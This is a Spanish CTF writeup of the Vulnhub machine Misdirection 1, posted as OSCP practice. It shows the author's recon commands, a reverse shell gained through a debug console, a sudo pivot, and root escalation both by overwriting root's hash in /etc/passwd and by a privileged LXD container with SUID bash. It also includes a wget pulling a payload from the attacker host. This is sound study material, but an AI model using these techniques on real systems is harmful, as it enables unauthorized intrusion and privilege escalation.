---
title: Misdirection1 Writeup - Vulnhub
date: 2025-03-03
categories: [Writeups, Vulnhub OSCP Prep]
tags: [Linux, Vulnhub, CTF, Misdirection1, OSCP Prep, LXD]
image:
  path: /assets/img/commons/vulnhub/Misdirection1/portada.png
---

Anterior [**OSCP Lab 14**](https://lvs3c.github.io/posts/OSCP-Prime1/)

¡Saludos!

`OSCP Lab 15`

En este writeup, realizaremos la máquina [**Misdirection 1**](https://www.vulnhub.com/entry/misdirection-1,371/). 

Se trata de una máquina **Linux** en la cual veremos:
- **Enumeración de servicios**.
- **Ganar reverse shell** mediante consola interactiva.
- **User Pivoting** con acceso a la bash, listando la user flag.
- Y por último, tenemos dos formas de elevar nuestro privilegio y listar la root flag.
    - Permisos para modificar el archivo `/etc/passwd`{: .filepath}.
    - Abusar de `LXD`{: .filepath}, montando un contenedor con privilegios, cambiando el bit SUID de la bash, para posteriormente convertirnos en root.

¡Empecemos!

## Reconocimiento activo

---

Necesitamos encontrar la ip correspondiente a la máquina, lo hacemos mediante la herramienta `arp-scan` y posteriormente el comando `ping` para verificar si la máquina objetivo está activa.

```bash
❯ sudo arp-scan -I ens37 --localnet --ignoredups
Interface: ens37, type: EN10MB, MAC: 00:0c:29:ef:5b:48, IPv4: 10.11.12.10
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
10.11.12.1      00:50:56:c0:00:01       VMware, Inc.
10.11.12.29     00:0c:29:61:c6:2d       VMware, Inc.
10.11.12.200    00:50:56:f0:94:61       VMware, Inc.
```

```bash
❯ ping -c 1 10.11.12.29
PING 10.11.12.29 (10.11.12.29) 56(84) bytes of data.
64 bytes from 10.11.12.29: icmp_seq=1 ttl=64 time=0.597 ms

--- 10.11.12.29 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.597/0.597/0.597/0.000 ms
```

## Escaneo

---

A continuación, realizamos un escaneo con `Nmap` para identificar los puertos abiertos en el sistema objetivo.

```bash
❯ sudo nmap -p- --open -sS --min-rate 5000 -n -Pn 10.11.12.29 -oG nmap_ports
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-03 17:12 -03
Nmap scan report for 10.11.12.29
Host is up (0.0048s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
8080/tcp open  http-proxy
MAC Address: 00:0C:29:61:C6:2D (VMware)

Nmap done: 1 IP address (1 host up) scanned in 5.71 seconds
```

## Enumeración

---

Seguidamente, efectuamos una enumeración de las versiones de los servicios asociados a los puertos abiertos. Además, ejecutamos un conjunto de scripts predeterminados de `Nmap` para realizar pruebas complementarias sobre los puertos y servicios identificados.

```bash
❯ sudo nmap -p22,80,3306,8080 -sCV 10.11.12.29 -oN nmap_services
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-03 17:12 -03
Nmap scan report for 10.11.12.29
Host is up (0.00046s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 ec:bb:44:ee:f3:33:af:9f:a5:ce:b5:77:61:45:e4:36 (RSA)
|   256 67:7b:cb:4e:95:1b:78:08:8d:2a:b1:47:04:8d:62:87 (ECDSA)
|_  256 59:04:1d:25:11:6d:89:a3:6c:6d:e4:e3:d2:3c:da:7d (ED25519)
80/tcp   open  http    Rocket httpd 1.2.6 (Python 2.7.15rc1)
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
|_http-server-header: Rocket 1.2.6 Python/2.7.15rc1
3306/tcp open  mysql   MySQL (unauthorized)
8080/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: 00:0C:29:61:C6:2D (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.97 seconds
```

El informe de `Nmap` nos revela:
- Puerto `22` servidor `OpenSSH 7.6p1`.
- Puerto `80` servidor `Rocket httpd 1.2.6`.
- Puerto `3306` servidor `MySQ`.
- Puerto `8080` servidor `Apache httpd 2.4.29`.

 
### HTTP - 80 - 8080

Hacemos un análisis de las webs con `whatweb` para ver sus tecnologías.

```bash
❯ whatweb http://10.11.12.29
http://10.11.12.29 [200 OK] Cookies[session_id_init], Country[RESERVED][ZZ], HTTPServer[Rocket 1.2.6 Python/2.7.15rc1], HttpOnly[session_id_init], IP[10.11.12.29], JQuery, Meta-Author[Massimo Di pierro], Python[2.7.15rc1], Script[text/javascript], Web2py[web2py], X-Powered-By[web2py], X-UA-Compatible[IE=edge]

❯ whatweb http://10.11.12.29:8080
http://10.11.12.29:8080 [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.11.12.29], Title[Apache2 Ubuntu Default Page: It works]
```

![web](/assets/img/commons/vulnhub/Misdirection1/web.png){: .center-image }
![web8080](/assets/img/commons/vulnhub/Misdirection1/web8080.png){: .center-image }


Continuamos realizando un fuzzing de directorios rápido con el script `http-enum` de nmap sobre los puertos 80 y 8080.

```bash
❯ sudo nmap -p80,8080 --script http-enum 10.11.12.29 -oN nmap_webscan
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-03 18:09 -03
Stats: 0:16:44 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 50.00% done; ETC: 18:42 (0:16:44 remaining)
Stats: 0:16:49 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 50.00% done; ETC: 18:42 (0:16:49 remaining)
Nmap scan report for 10.11.12.29
Host is up (0.00028s latency).

PORT     STATE SERVICE
80/tcp   open  http
| http-enum:
|   /admin/: Possible admin folder
|   /admin/admin/: Possible admin folder
|   /admin/backup/: Possible backup
|   /admin/download/backup.sql: Possible database backup
|   /examples/: Sample scripts
|   /admin/libraries/ajaxfilemanager/ajaxfilemanager.php: Log1 CMS
|   /admin/view/javascript/fckeditor/editor/filemanager/connectors/test.html: OpenCart/FCKeditor File upload
|   /admin/includes/tiny_mce/plugins/tinybrowser/upload.php: CompactCMS or B-Hind CMS/FCKeditor File upload
|   /admin/includes/FCKeditor/editor/filemanager/upload/test.html: ASP Simple Blog / FCKeditor File Upload
|   /admin/jscript/upload.php: Lizard Cart/Remote File upload
|   /admin/jscript/upload.html: Lizard Cart/Remote File upload
|   /admin/jscript/upload.pl: Lizard Cart/Remote File upload
|_  /admin/jscript/upload.asp: Lizard Cart/Remote File upload
8080/tcp open  http-proxy
| http-enum:
|   /wordpress/: Blog
|   /wordpress/wp-login.php: Wordpress login page.
|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|   /debug/: Potentially interesting folder
|   /development/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|   /help/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|   /images/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|   /js/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|   /manual/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|_  /scripts/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
MAC Address: 00:0C:29:61:C6:2D (VMware)

Nmap done: 1 IP address (1 host up) scanned in 1104.14 seconds
```

No encontramos mucha información sobre el puerto 80 pero sí sobre el puerto 8080.


## Explotación

---

Sobre el puerto 8080 tenemos el directorio `/debug`, el cual es una consola para ingresar comandos.

Compartimos nuestro recurso [php-reverse-shell.php](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php), lo descargamos y obtenemos la reverse shell.

![p0wny](/assets/img/commons/vulnhub/Misdirection1/p0wny.png){: .center-image }
![shell](/assets/img/commons/vulnhub/Misdirection1/shell.png){: .normal }


## User Pivoting

---

El usuario `www-data` tiene permiso para ejecutar `/bin/bash`{: .filepath} con el usuario `brexit`. 

```bash
www-data@misdirection:/home/brexit$ sudo -l
Matching Defaults entries for www-data on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on localhost:
    (brexit) NOPASSWD: /bin/bash
```

Nos conectamos con el usuario `brexit`{: .filepath} y listamos la user flag.

```bash
www-data@misdirection:/home/brexit$ sudo -u brexit /bin/bash
brexit@misdirection:~$ whoami
brexit
brexit@misdirection:~$ cat user.txt
404b9193154be7fbbc56d7534cb26339
```

## Escalación de privilegios

---

>Vamos a ver dos formas de escalar privilegios. Mediante edición del archivo `/etc/passwd`{: .filepath} y a través de un contenedor en `LXD`{: .filepath}.
{: .prompt-tip }

### Permisos en archivo /etc/passwd

El usuario brexit tiene permiso para editar el archivo `passwd`, con lo cual le podemos asignar a root una password.

Para agregar una contraseña al archivo passwd, lo haremos con `openssl passwd`.

```bash
❯ openssl passwd
Password:
Verifying - Password:
$1$JKOHqfu9$KQxnKf4GMa.EA.RdJdVzm0

bash-4.4$ nano /etc/passwd

bash-4.4$ cat /etc/passwd
root:$1$JKOHqfu9$KQxnKf4GMa.EA.RdJdVzm0:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
brexit:x:1000:1000:brexit:/home/brexit:/bin/bash
mysql:x:111:113:MySQL Server,,,

bash-4.4$ su - root
Password:
root@misdirection:~# pwd
/root
root@misdirection:~# ls -l
total 4
-r-------- 1 root root 33 Jun  1  2019 root.txt
root@misdirection:~# cat root.txt
0d2c6222bfdd3701e0fa12a9a9dc9c8c
```

### Contenedor LXD

El usuario brexit tiene permiso al grupo `LXD`, con lo cual podemos elevar nuestro privilegio, montando la unidad `/` en el contenedor y luego asignando el bit SUID a la bash.

Usamos una imagen [alpine](https://github.com/saghul/lxd-alpine-builder.git) de lxd, la cual compartimos desde nuestra máquina.

```bash
git clone https://github.com/saghul/lxd-alpine-builder.git 
cd lxd-alpine-builder 
./build-alpine
```

```bash
brexit@misdirection:/tmp$ id
uid=1000(brexit) gid=1000(brexit) groups=1000(brexit),24(cdrom),30(dip),46(plugdev),108(lxd)

brexit@misdirection:/tmp$ wget 10.11.12.10/alpine-v3.13-x86_64-20210218_0139.tar.gz
--2025-03-03 23:54:02--  http://10.11.12.10/alpine-v3.13-x86_64-20210218_0139.tar.gz
Connecting to 10.11.12.10:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3259593 (3.1M) [application/gzip]
Saving to: 'alpine-v3.13-x86_64-20210218_0139.tar.gz'

alpine-v3.13-x86_64-20210218_0139.tar.gz                           0%[                                                                                               alpine-v3.13-x86_64-20210218_0139.tar.gz                         100%[==========================================================================================================================================================>]   3.11M  --.-KB/s    in 0.03s

2025-03-03 23:54:02 (110 MB/s) - 'alpine-v3.13-x86_64-20210218_0139.tar.gz' saved [3259593/3259593]

brexit@misdirection:/tmp$ ls -l
total 4008
-rw-r--r-- 1 brexit   brexit   3259593 Mar  3 23:53 alpine-v3.13-x86_64-20210218_0139.tar.gz
```

Lo que debemos hacer ahora es importar la imagen, asignarla a un contenedor con el permiso `security.privileged=true`, luego la inicializamos e ingresamos dentro del contenedor, asignamos el bit SUID a la bash.

```bash
rexit@misdirection:/tmp$ lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
Image imported with fingerprint: cd73881adaac667ca3529972c7b380af240a9e3b09730f8c8e4e6a23e1a7892b

brexit@misdirection:/tmp$ lxd init --auto
brexit@misdirection:/tmp$ lxc image list
+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
|  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE          |
+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
| myimage | cd73881adaac | no     | alpine v3.13 (20210218_01:39) | x86_64 | 3.11MB | Mar 3, 2025 at 11:59pm (UTC) |
+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+

brexit@misdirection:/tmp$ lxc init myimage ignite -c security.privileged=true
Creating ignite

brexit@misdirection:/tmp$ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
Device mydevice added to ignite

brexit@misdirection:/tmp$ lxc start ignite

brexit@misdirection:/tmp$ lxc exec ignite /bin/sh
~ # cd /mnt/
/mnt # cd root/
/mnt/root/bin # ls -l bash
-rwxr-xr-x    1 root     root       1113504 Apr  4  2018 bash
/mnt/root/bin # whoami
root
/mnt/root/bin # chmod u+s bash
/mnt/root/bin # ls -l bash
-rwsr-xr-x    1 root     root       1113504 Apr  4  2018 bash
/mnt/root/bin # exit
```

Salimos del contenedor y ejecutamos `bash -p` para convertirnos en root y listamos la root flag.

```bash
brexit@misdirection:/tmp$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1113504 Apr  4  2018 /bin/bash

brexit@misdirection:/tmp$ bash -p
bash-4.4# find / -type f -name root.txt 2>/dev/null
/var/www/html/wordpress/root.txt
/root/root.txt
bash-4.4# cat /var/www/html/wordpress/root.txt
bash-4.4# cat /root/root.txt
0d2c6222bfdd3701e0fa12a9a9dc9c8c
bash-4.4#
```

Hope it helps!